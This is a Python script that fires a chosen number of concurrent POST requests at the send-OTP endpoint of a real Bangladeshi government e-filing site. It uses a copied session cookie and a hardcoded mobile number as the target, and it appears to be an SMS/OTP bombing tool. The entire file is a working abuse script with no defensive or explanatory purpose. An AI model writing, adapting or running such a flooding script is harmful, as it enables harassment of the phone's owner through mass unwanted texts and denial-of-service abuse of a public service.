import asyncio
import httpx

# Function to send the request asynchronously
async def send_request(client, url, headers, data, request_number):
    try:
        response = await client.post(url, headers=headers, data=data)
        print(f"Request {request_number}: {response.status_code} - {response.text[:100]}")
    except Exception as e:
        print(f"Request {request_number} failed: {e}")

# Main function to handle multiple requests
async def send_multiple_requests(url, headers, data, num_requests):
    async with httpx.AsyncClient() as client:
        tasks = []
        for i in range(num_requests):
            task = send_request(client, url, headers, data, i + 1)
            tasks.append(task)
        
        # Await all the tasks to send requests concurrently
        await asyncio.gather(*tasks)

def main():
    url = 'https://efiling.ebmeb.gov.bd/index.php/eiinsim/sendotp'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': 'ci_session=0665cd6ec60b91d5172234bfadd75973fdc518dd',
        'origin': 'https://efiling.ebmeb.gov.bd',
        'priority': 'u=1, i',
        'referer': 'https://efiling.ebmeb.gov.bd/index.php/eiinsim/applicationform',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }

    data = {
        'mobile': '01313613360'
    }

    # Ask the user how many requests to send
    num_requests = int(input("How many requests do you want to send? "))

    # Run the async loop to send multiple requests
    asyncio.run(send_multiple_requests(url, headers, data, num_requests))

if __name__ == "__main__":
    main()
